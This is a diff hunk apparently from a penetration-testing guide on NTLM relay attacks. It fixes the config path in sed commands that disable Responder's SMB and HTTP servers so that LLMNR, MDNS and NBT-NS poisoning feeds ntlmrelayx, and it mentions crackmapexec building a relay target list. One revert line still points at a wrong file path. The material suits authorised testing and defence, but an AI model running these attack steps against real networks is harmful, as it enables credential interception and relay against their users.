@@ -87,11 +87,11 @@ crackmapexec smb scope.txt --gen-relay-list relay.txt
 Before starting responder to poison the answer to LLMNR, MDNS and NBT-NS request we must stop the responder smb and http server as we don’t want to get the hashes directly but we want to relay them to ntlmrelayx.
 
 ```bash
-sed -i 's/HTTP = On/HTTP = Off/g' /etc/Responder/Responder.conf && cat /etc/Responder/Responder.conf | grep --color=never 'HTTP ='
-sed -i 's/SMB = On/SMB = Off/g' /etc/Responder/Responder.conf && cat /etc/Responder/Responder.conf | grep --color=never 'SMB ='
+sed -i 's/HTTP = On/HTTP = Off/g' /etc/responder/Responder.conf && cat /etc/responder/Responder.conf | grep --color=never 'HTTP ='
+sed -i 's/SMB = On/SMB = Off/g' /etc/responder/Responder.conf && cat /etc/responder/Responder.conf | grep --color=never 'SMB ='
 #Revert process
-sed -i 's/HTTP = Off/HTTP = On/g' /etc/Responder/Responder.conf && cat /etc/Responder.conf | grep --color=never 'HTTP ='
-sed -i 's/SMB = Off/SMB = On/g' /etc/Responder/Responder.conf && cat /etc/Responder/Responder.conf | grep --color=never 'SMB ='
+sed -i 's/HTTP = Off/HTTP = On/g' /etc/responder/Responder.conf && cat /etc/responder.conf | grep --color=never 'HTTP ='
+sed -i 's/SMB = Off/SMB = On/g' /etc/responder/Responder.conf && cat /etc/responder/Responder.conf | grep --color=never 'SMB ='
 ```
 
 Start ntlmrelay
